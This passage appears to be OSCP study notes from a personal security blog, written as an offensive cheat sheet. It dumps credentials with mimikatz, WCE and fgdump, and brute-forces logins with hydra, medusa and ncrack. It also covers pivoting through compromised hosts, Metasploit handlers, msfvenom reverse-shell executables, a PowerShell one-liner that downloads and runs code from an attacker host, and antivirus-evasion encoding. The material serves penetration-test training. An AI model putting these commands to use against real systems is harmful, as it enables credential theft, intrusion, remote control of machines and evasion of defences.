<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">fgdump.exe
</code></pre></div><p>You can crack them online at <a href="http://cracker.offensive-security.com/">http://cracker.offensive-security.com/</a> or use <code>john [hashes]</code> on Kali.</p>
<pre><code>Jason:502:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::
[username]:[relative identifier (500 - admin, 502 - kerboros)]:[LM hash]:[NT hash]
</code></pre><h3 id="windows-credential-editor-wce">Windows Credential Editor (WCE)</h3>
<p>WCE can steal NTLM credentials from memory and dump cleartext passwords stored by Windows authentication packages installed on the target system such as msv1_0.dll, kerberos.dll, and digest.dll.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">wce -l # default, dumps NTLM hashes fromm LSASS process memory, more secure in terms of OS stability
wce -w # dumps plaintext passwords using DLLs
</code></pre></div><p><a href="https://www.ampliasecurity.com/research/windows-credentials-editor/">https://www.ampliasecurity.com/research/windows-credentials-editor/</a></p>
<h3 id="mimikatz">mimikatz</h3>
<pre><code>privilege::debug

# Dump Passwords
sekurlsa::logonpasswords

# Passing the Hash
sekurlsa::pth /user:Administrator /domain:{domain name, eg. winxp} /ntlm:{ntlm hash here} /run:cmd

# krbtgt hash (Domain Controller)
lsadump::dcsync /user:krbtgt
lsadump::lsa /inject /name:krbtgt
</code></pre><h3 id="more-active-directory">More Active Directory</h3>
<ul>
<li>mimikatz (meterpreter modules)</li>
<li>mimikatz (manual lsadump)</li>
<li><code>post/windows/gather/smart_hashdump</code></li>
<li><code>post/windows/gather/credentials/gpp</code> or <code>cd &quot;C:\Windows\SYSVOL&quot; &amp;&amp; dir /s Groups.xml</code> then <code>gpp-decrypt [cpassword]</code> on Kali</li>
<li><code>post/windows/escalate/golden_ticket</code></li>
</ul>
<h4 id="14141---passing-the-hash-pth">14.1.4.1 - Passing the Hash (PTH)</h4>
<p>Authenticate using a NT/LM hash instead of the plaintext password, saving time and effort.</p>
<p>Refer to SMB enumeration section:</p>
<ul>
<li><code>CrackMapExec</code></li>
<li><code>smbmap</code></li>
<li><code>smbclient</code></li>
<li><code>pth-winexe</code></li>
<li><code>exploit/windows/smb/psexec</code></li>
</ul>
<h3 id="password-profiling-with-cewl-and-john">Password Profiling with <code>cewl</code> and <code>john</code></h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cewl www.conglomerate.com -m <span style="color:#ae81ff">6</span> -w conglomerate-cewl.txt <span style="color:#75715e"># scrape and generate password list from words found</span>
<span style="color:#75715e"># Add two numbers to the end of each password</span>
<span style="color:#75715e"># $[0-9]$[0-9] # add this line to /etc/john/john.conf to mutate our dictionary with 2 appended digits</span>
john --wordlist<span style="color:#f92672">=</span>conglomerate-cewl.txt --rules --stdout &gt; mutated.txt
</code></pre></div><h2 id="online-password-attacks">Online Password Attacks</h2>
<h4 id="14211---medusa">14.2.1.1 - <code>medusa</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">medusa -d <span style="color:#75715e"># list modules. modules available: cvs, ftp, http, imap, mssql, mysql, nntp, pcanywhere, pop3, postgres, rdp, rexec, rlogin, rsh, smbnt, smtp-vrfy, smtp, snmp, ssh, svn, telnet, vmauthd, vnc, web-form, wrapper</span>
medusa -h 192.168.1.23 -u admin -P password-file.txt -M http -m DIR:/admin -T <span style="color:#ae81ff">20</span> <span style="color:#75715e"># http brute force password</span>
medusa -h 192.168.1.23 -p admin -U user-file.txt -M http -m DIR:/admin -T <span style="color:#ae81ff">20</span> <span style="color:#75715e"># http brute force username</span>
</code></pre></div><h4 id="14212---ncrack">14.2.1.2 - <code>ncrack</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Modules available: FTP, SSH, Telnet, HTTP(S), POP3(S), SMB, RDP, VNC, SIP, Redis, PostgreSQL, MySQL</span>
ncrack -vv --user offsec -P password-file.txt rdp://192.168.1.23 <span style="color:#75715e"># rdp brute force password</span>
ncrack -vv --password offsec -U user-file.txt rdp://192.168.1.23 <span style="color:#75715e"># rdp brute force username</span>
</code></pre></div><p>Due to the way RDP works, multiple threads are not practical in this case, which makes the brute force process rather slow.</p>
<h4 id="14213---hydra">14.2.1.3 - <code>hydra</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Modules available: adam6500, asterisk, cisco, cisco-enable, cvs, firebird, ftp, ftps, http[s]-{head|get|post}, http[s]-{get|post}-form, http-proxy, http-proxy-urlenum, icq, imap[s], irc, ldap2[s], ldap3[-{cram|digest}md5][s], mssql, mysql, nntp, oracle-listener, oracle-sid, pcanywhere, pcnfs, pop3[s], postgres, radmin2, rdp, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, sip, smb, smtp[s], smtp-enum, snmp, socks5, ssh, sshkey, svn, teamspeak, telnet[s], vmauthd, vnc, xmpp</span>
hydra -vV -l root -P password-file.txt 192.168.1.23 ftp <span style="color:#75715e"># ftp brute force password</span>
hydra -vV -p root -L user-file.txt 11.11.1.219 ftp <span style="color:#75715e"># ftp brute force username</span>
hydra -vV -l root -P password-file.txt 192.168.1.23 ssh <span style="color:#75715e"># ssh brute force password</span>
hydra -vV -l root -P fasttrack.txt -M hosts -o bruteforce ssh <span style="color:#75715e"># ssh brute force password of multiple hosts and output to file</span>
hydra -vV -f -P password-file.txt 192.168.1.23 snmp <span style="color:#75715e"># snmp brute force password, stop when found</span>
hydra -vV -f -C userpass.txt 192.168.1.23 ftp <span style="color:#75715e"># ftp brute force login, using [user]:[pass] file, stop when found</span>
hydra -vV -f -l admin -P <span style="color:#f92672">[</span>pw dict<span style="color:#f92672">]</span> -t <span style="color:#f92672">[</span>threads<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>output<span style="color:#f92672">]</span> -s <span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>host<span style="color:#f92672">]</span> http-get <span style="color:#f92672">[</span>page <span style="color:#f92672">(</span>/camera.cgi<span style="color:#f92672">)]</span>
hydra -vV -f -l admin -P <span style="color:#f92672">[</span>pw dict<span style="color:#f92672">]</span> -t <span style="color:#f92672">[</span>threads<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>output<span style="color:#f92672">]</span> -s <span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>host<span style="color:#f92672">]</span> http-form-post <span style="color:#e6db74">&#34;[post page]:[post data]:[failed attempt regex]&#34;</span>
hydra -vV -f -l admin -P /usr/share/dirb/wordlists/small.txt -t <span style="color:#ae81ff">50</span> -o login-brute-force 192.168.1.23 http-form-post <span style="color:#e6db74">&#34;/index.php:target=auth&amp;mode=login&amp;user_login=^USER^&amp;password=^PASS^:The username or password you entered is invalid&#34;</span>
hydra -e nsr <span style="color:#75715e"># n - check for null password, s - use the same username as the password, r - reverses the username and uses it as password. total +3 more requests</span>
</code></pre></div><h4 id="14215---account-lockouts-and-log-alerts">14.2.1.5 - Account Lockouts and Log Alerts</h4>
<p>Online password brute-force attacks are noisy. Generates logs, warnings, may even lock out accounts. Could be disastraous as valid users may be unable to access the service until admin re-enables their account.</p>
<h3 id="choosing-the-right-protocol-speed-vs-reward">Choosing the Right Protocol: Speed vs Reward</h3>
<p>Speed up brute-force by increasing number of threads, however, doesn&rsquo;t work on certain protocols like RDP and SMB. And on of that, RDP authentication negotiations are more time consuming than say HTTP. However even if it is slower, a successful attack on RDP would often provide a bigger reward. The hidden art behind online brute-force attacks is choosing your targets, user lists, and password files carefully and intelligently before intiating the attack.</p>
<h2 id="password-hash-attacks">Password Hash Attacks</h2>
<h3 id="identifying-a-hash">Identifying a Hash</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ hash-identifier
...
-------------------------------------------------------------------------
HASH: c43ee559d69bc7f691fe2fbfe8a5ef0a
Possible Hashs:
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MD5
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Cached Credentials - MD4<span style="color:#f92672">(</span>MD4<span style="color:#f92672">((</span>$pass<span style="color:#f92672">))</span>.<span style="color:#f92672">(</span>strtolower<span style="color:#f92672">(</span>$username<span style="color:#f92672">)))</span>
</code></pre></div><h3 id="john-the-ripper">John the Ripper</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">john <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># brute force</span>
john -wordlist:/usr/share/wordlists/rockyou.txt <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># dictionary</span>
john -rules -wordlist:/usr/share/wordlists/rockyou.txt -format:nt <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># dictionary + john&#39;s mangle rules</span>
john -show -format:nt <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># rmb to include the format when showing</span>

unshadow passwd shadow &gt; unshadow.txt <span style="color:#75715e"># combine them</span>
john -rules -wordlist:/usr/share/wordlists/rockyou.txt <span style="color:#f92672">[</span>unshadow.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># dictionary + john&#39;s mangle rules</span>
</code></pre></div><h1 id="port-redirection-and-tunneling">Port Redirection and Tunneling</h1>
<h2 id="local-port-forwarding">Local Port Forwarding</h2>
<p>Opens a local port that forwards all traffice headed to that port to the destination</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Bob:80</span>
<span style="color:#75715e"># On Alice</span>
ssh root@bob -f -N -L 8080:localhost:80 <span style="color:#75715e"># perspective of server, localhost is the SSH server itself, Bob</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Charlie:3389</span>
<span style="color:#75715e"># On Alice</span>
ssh root@bob -f -N -L 8080:charlie:3389 <span style="color:#75715e"># perspective of server</span>
</code></pre></div><h2 id="remote-port-forwarding">Remote Port Forwarding</h2>
<p>Opens a remote port that forwards all traffic headed to that port to the destination</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Bob:80</span>
<span style="color:#75715e"># On Bob</span>
ssh root@alice -f -N -R 8080:localhost:80 <span style="color:#75715e"># perspective of initiator, Bob</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Charlie:3389</span>
<span style="color:#75715e"># On Bob</span>
ssh root@alice -f -N -R 8080:charlie:3389 <span style="color:#75715e"># perspective of initiator, Bob</span>
</code></pre></div><h2 id="pivoting">Pivoting</h2>
<h3 id="dynamic-port-forwarding-and-proxychains">Dynamic Port Forwarding and Proxychains</h3>
<p>Opens a local port that forwards all traffic headed to that port to the destination machine, essentially allowing you to access new networks that are not directly accessible, and perform tasks such as nmap scanning without the need of installing nmap on the pivot host.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Bob &amp; Charlie&#39;s Network:0-65535</span>

<span style="color:#75715e"># On Alice</span>
ssh root@bob -D <span style="color:#ae81ff">8080</span>
echo <span style="color:#e6db74">&#39;[ProxyList]&#39;</span> &gt; proxychains.conf
echo <span style="color:#e6db74">&#39;socks5 127.0.0.1 8080&#39;</span> &gt;&gt; proxychains.conf
proxychains nmap -T4 -n -Pn -sT -F -p <span style="color:#ae81ff">80</span> charlie
</code></pre></div><p>IMPORTANT NOTE on Proxychains and Nmap:</p>
<ul>
<li>Use <code>-sT -Pn</code> when proxychaining nmap!
<ul>
<li>ICMP (nmap host detection), UDP, nmap OS detection and non-fully established TCP connections (nmap SYN scan) will not work through proxychain, and will result in leakage, meaning your connections will go through as if without having a proxy at all, including revealing your IP address.</li>
<li>Why didn&rsquo;t proxychain work with nmap in the OffsecVM, but works on main Kali box? OffsecVM -&gt; running proxychain nmap as ROOT -&gt; defaults to SYN scan -&gt; proxychain fails to establish SOCKS connection. Main Kali -&gt; running proxychain nmap as non-privileged user -&gt; defaults to TCP scan -&gt; proxychain successfully establishes SOCKS connection.</li>
</ul>
</li>
<li>No SYN scans, ICMP, UDP and OS detection: <a href="https://security.stackexchange.com/a/122562">https://security.stackexchange.com/a/122562</a></li>
<li>Nmap and proxychains: <a href="https://ntu-offsec.github.io/blog/articles/nmap-proxychains/">https://ntu-offsec.github.io/blog/articles/nmap-proxychains/</a></li>
<li>ICMP/pings will not work with SOCKS proxy, as SOCKS is on layer 5 that acts as a proxy for TCP and UDP connections, of which ICMP requests are not. <a href="https://superuser.com/a/1030803">https://superuser.com/a/1030803</a></li>
</ul>
<p>Resources:</p>
<ul>
<li>Guide: <a href="https://netsec.ws/?p=278">https://netsec.ws/?p=278</a></li>
<li>plink, Windows ssh equivalent: <code>/usr/share/windows-binaries/plink.exe</code></li>
<li>3proxy, Windows SOCKS Proxy Server: <a href="https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285">https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285</a> <a href="https://github.com/z3APA3A/3proxy">https://github.com/z3APA3A/3proxy</a></li>
<li>IE does not proxy DNS requests!: <a href="https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285">https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285</a></li>
</ul>
<h3 id="pivoting-with-metasploit">Pivoting with Metasploit</h3>
<p>If you (192.168.1.23) compromised a host with two NICs (192.168.1.23, 10.1.1.251) on session 1, simply use <code>route add</code> and now you can target that range.</p>
<pre><code>msf &gt; route add [subnet] [netmask] [session] # alternatively, `use post/windows/manage/autoroute` (module), or `run autoroute` (meterpreter)
msf &gt; route add 10.1.1.0 255.255.255.0 1
msf &gt; route print
msf &gt; use auxiliary/scanner/http/http_version
msf auxiliary(http_version) &gt; set RHOSTS 10.1.1.0/24
</code></pre><p>Once routes are established, Metasploit modules can access the IP range specified in the routes. Scans and exploits can be directed at machines that would otherwise be unreachable from the outside, via the sessions established. For other applications to access the routes, a little bit more setup is necessary. This involves setting up the Socks4a Metasploit module and using Proxychains in conjunction with the other applications.</p>
<pre><code>msf &gt; use auxiliary/server/socks4a
msf auxiliary(socks4a) &gt; set SRVHOST 127.0.0.1
msf auxiliary(socks4a) &gt; set LPORT 1080
msf auxiliary(socks4a) &gt; exploit -j
echo '[ProxyList]' &gt; proxychains.conf
echo 'socks4 127.0.0.1 1080' &gt;&gt; proxychains.conf
proxychains nmap -T4 -n ...
</code></pre><p>Want to add the route as a default route? Meaning without proxychains, traffic headed towards the remote network will be routed automatically.</p>
<pre><code>msf &gt; use post/multi/manage/autoroute
msf post(autoroute) &gt; set SESSION session-id
msf post(autoroute) &gt; set CMD default
msf post(autoroute) &gt; exploit
# or
meterpreter &gt; run post/multi/manage/autoroute CMD=default
</code></pre><p>Resources:</p>
<ul>
<li>Autoroute, with socks4a, proxychains and default route: <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/autoroute.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/autoroute.md</a></li>
<li>Pivoting multiple networks: <a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">https://pentest.blog/explore-hidden-networks-with-double-pivoting/</a></li>
<li>LPF, RPF, and DPF (Metasploit) scenario examples: <a href="https://www.cybrary.it/0p3n/pivot-network-port-forwardingredirection-hands-look/">https://www.cybrary.it/0p3n/pivot-network-port-forwardingredirection-hands-look/</a></li>
<li>Paper with examples: <a href="https://www.sans.org/reading-room/whitepapers/testing/tunneling-pivoting-web-application-penetration-testing-36117">https://www.sans.org/reading-room/whitepapers/testing/tunneling-pivoting-web-application-penetration-testing-36117</a></li>
<li>Metasploit Unleashed Pivoting (Autoroute): <a href="https://www.offensive-security.com/metasploit-unleashed/pivoting/">https://www.offensive-security.com/metasploit-unleashed/pivoting/</a></li>
<li>Metasploit Unleashed ProxyTunnels (Autoroute + Socks4a): <a href="https://www.offensive-security.com/metasploit-unleashed/proxytunnels/">https://www.offensive-security.com/metasploit-unleashed/proxytunnels/</a></li>
</ul>
<h2 id="http-encapsulation">HTTP Encapsulation</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Client:7070 -&gt; Server:8080 -&gt; Server:22</span>

<span style="color:#75715e"># On Server</span>
hts -F localhost:22 <span style="color:#ae81ff">8080</span>
<span style="color:#75715e"># On Client</span>
htc -F <span style="color:#ae81ff">7070</span> 192.168.161.159:8080
ssh root@localhost:7070
</code></pre></div><p>Wireshark inspection reveals normal SSH session packets are identified as &ldquo;Encrypted packets&rdquo; and have &ldquo;SSL Protocol&rdquo; fields in them. After using HTTPTunnel, the packets no longer show those, and look like ordinary TCP packets.</p>
<ul>
<li>HTTPTunnel - <a href="https://tools.kali.org/maintaining-access/httptunnel">https://tools.kali.org/maintaining-access/httptunnel</a></li>
</ul>
<h1 id="metasploit">Metasploit</h1>
<h3 id="starting">Starting</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># PostgreSQL</span>
service postgresql start
<span style="color:#75715e"># PostgreSQL manual start</span>
sudo -H -u postgres bash -c <span style="color:#e6db74">&#34;/usr/lib/postgresql/9.6/bin/postgres -D /var/lib/postgresql/9.6/main -c config_file=/etc/postgresql/9.6/main/postgresql.conf&#34;</span>

<span style="color:#75715e"># Starting msfconsole</span>
msfconsole
</code></pre></div><p>Note, after installing either neovim or samba-4.5.15, postgresql service scripts stops working.</p>
<h3 id="usage">Usage</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Searching for Modules</span>
search <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>
serach type:auxiliary <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>
grep <span style="color:#f92672">[</span>keyword<span style="color:#f92672">]</span> search <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>

<span style="color:#75715e"># Module Usage</span>
use <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>
info
show options
set rhost <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>
set rhosts <span style="color:#f92672">[</span>ips/range<span style="color:#f92672">]</span>      <span style="color:#75715e"># for modules that support multiple hosts</span>
setg rhosts <span style="color:#f92672">[</span>ips/range<span style="color:#f92672">]</span>     <span style="color:#75715e"># global/persistent set</span>
set threads <span style="color:#ae81ff">10</span>              <span style="color:#75715e"># for modules that support threads</span>
set payload windows/meterpreter/reverse_tcp <span style="color:#75715e"># optional, meterpreter is default</span>
show targets
set target <span style="color:#ae81ff">1</span>                <span style="color:#75715e"># optional, 0 is default</span>
set InitialAutoRunScript migrate -f <span style="color:#75715e"># migrate immediately after getting shell. good for client-side attacks, since victim may close the browser</span>
set EnableStageEncoding true <span style="color:#75715e"># &#34;Command shell session 1 closed.  Reason: Died from Errno::ECONNRESET&#34;? disable encoding. set to true, its a bug (https://github.com/rapid7/metasploit-framework/issues/8357)</span>
set StageEncoder <span style="color:#e6db74">&#34;generic/none&#34;</span> <span style="color:#75715e"># disable encoding.</span>
exploit

<span style="color:#75715e"># Multi Handler</span>
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp <span style="color:#75715e"># required especially for staged payloads (meterpreter and shell/etc.)</span>
set lhost 0.0.0.0
set lport <span style="color:#ae81ff">443</span>
set ExitOnSession false
exploit -j

<span style="color:#75715e"># Job Handling (when using exploit -j)</span>
jobs            <span style="color:#75715e"># list</span>
jobs -k <span style="color:#ae81ff">1</span>       <span style="color:#75715e"># kil</span>

<span style="color:#75715e"># Session Handling</span>
sessions        <span style="color:#75715e"># list</span>
sessions -i <span style="color:#ae81ff">1</span>   <span style="color:#75715e"># interact</span>
sessions -u <span style="color:#ae81ff">1</span>   <span style="color:#75715e"># upgrade shell to meterpreter</span>
sessions -k <span style="color:#ae81ff">1</span>   <span style="color:#75715e"># kill</span>

<span style="color:#75715e"># Workspaces</span>
workspace
workspace -a lab
workspace lab
workspace -d test
db_export -f xml /tmp/ms.xml
db_import /tmp/ms.xml

<span style="color:#75715e"># Database</span>
hosts
db_nmap -T4 ...
services -p <span style="color:#ae81ff">443</span>
services -p <span style="color:#ae81ff">443</span> -R  <span style="color:#75715e"># populate RHOSTS with result</span>
hosts -c address,os_flavor -S Linux <span style="color:#75715e"># 2 columns, search Linux</span>
services -c name,info -S http -R  <span style="color:#75715e"># 2 columns, search http, and populate RHOSTS with results</span>
creds
creds -a 192.168.1.23 -p <span style="color:#ae81ff">22</span> -u root -P toor
loot
</code></pre></div><h3 id="explored-modules">Explored Modules</h3>
<pre><code># Auxiliary
auxiliary/scanner/snmp/snmp_enum
auxiliary/scanner/smb/smb_version
auxiliary/scanner/http/webdav_scanner # apparently WebDAV servers are often poorly cofigured and can often lead to quick and easy shell
auxiliary/scanner/ftp/ftp_login

# Exploits
exploit/windows/smb/ms08_067_netapi
exploit/windows/smb/ms17_010_eternalblue
</code></pre><h3 id="common-payloads">Common Payloads</h3>
<h4 id="staged-payload">Staged Payload</h4>
<p>2 parts, great when there is little buffer space for shellcode. Requires multi handler to send stage 2. Meterpreter is always staged.</p>
<pre><code>[platform]/[arch?]/[shell/meterpreter]/[reverse/bind]_[protocol]
windows/meterpreter/reverse_https
linux/x86/shell/reverse_tcp
</code></pre><h4 id="non-stagedsingles-payloads">Non-Staged/Singles Payloads</h4>
<p>Entire shellcode in payload</p>
<pre><code>[platform]/[arch?]/[shell]_[reverse/bind]_[protocol]
windows/shell_reverse_tcp
linux/x86/shell_reverse_tcp
</code></pre><h3 id="meterpreter">Meterpreter</h3>
<pre><code>sysinfo
getuid
search -f *pass*.txt
download c:\\users\\bob\\passwords.txt /tmp
upload /tmp/nc.exe c:\\
hashdump
getsystem
migrate [pid] # migrate to another process, as exploited process may hung (eg. during client-side attacks) or get killed
shell # advantage is if shell dies, you can go back up to meterpreter to spawn a new one
</code></pre><pre><code>use exploit/windows/local/service_permissions
set session 1
exploit
</code></pre><h3 id="executable-payloads">Executable Payloads</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -o shell.exe -x /usr/share/windows-binaries/plink.exe -k <span style="color:#75715e"># embed with existing program, and allow it to continue functionality with -k (spawn new thread)</span>
msfvenom -p linux/x86/exec CMD<span style="color:#f92672">=</span>/bin/sh -f elf -o gimmeshell
</code></pre></div><h3 id="custom-msf-module">Custom MSF Module</h3>
<p>Create in local directory, eg. <code>~/.msf4/modules/exploits/linux/misc</code>. Copy an existing template over like <code>/usr/share/metasploitframework/modules/exploits/linux/misc/gld_postfix.rb</code>. Change template, main part is <code>exploit</code> function.</p>
<h3 id="unicorn-powershell">Unicorn Powershell</h3>
<p>Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory, potentially evading firewalls.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># On Kali:</span>
./unicorn.py <span style="color:#f92672">[</span>metasploit payload<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>reverse_ip<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> <span style="color:#75715e"># generates powershell_attack.txt (actual output) and unicorn.rc (metasploit setup script)</span>
<span style="color:#75715e"># delete the &#34;powershell&#34; wrapper and quotes around the text in powershell_attack.txt</span>
python -m SimpleHTTPServer

<span style="color:#75715e"># On Windows:</span>
powershell <span style="color:#e6db74">&#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://[kali ip]:8000/powershell_attack.txt&#39;)&#34;</span> <span style="color:#75715e"># download and execute the powershell code</span>

<span style="color:#75715e"># On Kali:</span>
<span style="color:#75715e"># set up listener</span>
</code></pre></div><h1 id="bypassing-antivirus-software">Bypassing Antivirus Software</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -o shell.exe <span style="color:#75715e"># 30/46</span>
msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -o shell.exe <span style="color:#75715e"># 34/46</span>
msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -x /usr/share/windows-binaries/plink.exe -o shell.exe <span style="color:#75715e"># 27/46</span>
wine /usr/share/windows-binaries/hyperion/hyperion.exe shell.exe crypted.exe <span style="color:#75715e"># 14/46</span>
<span style="color:#75715e"># custom python reverse shell compiled to exe # 2/46</span>
<span style="color:#75715e"># custom C reverse shellcode compiled to exe # 1/46</span>
</code></pre></div><h1 id="forensics">Forensics</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">strings <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
grep -a <span style="color:#e6db74">&#39;[pattern]&#39;</span> <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
xdd <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
binwalk -Me <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
testdisk <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
photorec <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
</code></pre></div>
      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://tranquac.github.io/tags/oscp/">oscp</a></span>
        <span class="tag"><a href="https://tranquac.github.io/tags/infosec/">infosec</a></span>
        
    </p>

      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://tranquac.github.io/categories/oscp/">oscp</a></span>
        <span class="tag"><a href="https://tranquac.github.io/categories/infosec/">infosec</a></span>
        
    </p>


      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
